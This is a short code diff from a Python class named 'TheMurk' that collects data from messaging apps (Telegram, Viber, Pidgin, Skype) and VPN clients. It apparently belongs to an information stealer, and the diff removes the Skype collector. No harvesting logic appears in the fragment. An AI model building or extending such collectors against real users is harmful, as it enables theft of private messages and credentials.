@@ -56,7 +56,6 @@ class TheMurk:
         self.msgInfo[1] += Telegram()
         self.msgInfo[1] += Viber()
         self.msgInfo[1] += Pidgin()
-        self.msgInfo[1] += Skype()
     
     def GetVpn(self):
         self.msgInfo[1] += VPN()
